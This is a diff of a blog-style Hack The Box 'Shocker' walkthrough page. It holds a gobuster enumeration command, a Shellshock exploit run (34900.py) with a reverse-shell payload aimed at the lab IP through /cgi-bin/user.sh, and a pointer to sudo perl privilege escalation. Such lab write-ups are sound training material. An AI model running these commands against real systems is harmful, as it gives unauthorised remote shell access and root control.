@@ -32,7 +32,7 @@
          <div style="position:relative;top:0;left:0;right:0;z-index:100;-webkit-transform:translate3D(0, 0, 0);-ms-transform:translate3D(0, 0, 0);transform:translate3D(0, 0, 0);background:#000000;padding-top:7.5px;margin-bottom:1.rem;height:80px;" class="headroom headroom--unfixed">
             <div size="500" class="sc-htpNat fphlTp">
                <div style="margin:0 auto;max-width:960px" class="css-zkfaav">
-				  <a href="/"><img height="70" alt="wicked" src="/assets/images/WICKED.png" style="display:inline"/></a>
+				  <a href="../"><img height="70" alt="wicked" src="/assets/images/WICKED.png" style="display:inline"/></a>
                   <div class="css-1ntkiwo"></div>
                </div>
          </div>
@@ -86,7 +86,7 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://1
 <img src="/assets/images/htb/shocker/shocker_2.jpg"><br>
 <p>Note to reader: there will be an error when running the script. Windows and Linux have different break line interpretations - to fix, simply change the format from DOS to Unix with '<b>dos2unix 34900.py</b>' and run the script.</p>
 <pre><code>
-./34900.py payload=reverse rhost=<RHOST IP> lhost=<LHOST IP> lport=<LPORT> pages=/cgi-bin/user.sh
+./34900.py payload=reverse rhost=10.10.10.56 lhost=<LHOST IP> lport=<LPORT> pages=/cgi-bin/user.sh
 </code></pre>
 <img src="/assets/images/htb/shocker/shocker_3.jpg"><br>
 <p>As the user shelly, it looks like perl is allowed to use with sudo. Additionally, it seems like Perl can be used to privilege escalate, <a href="https://gtfobins.github.io/gtfobins/perl/">GTFOBins</a> verifies this.</p>
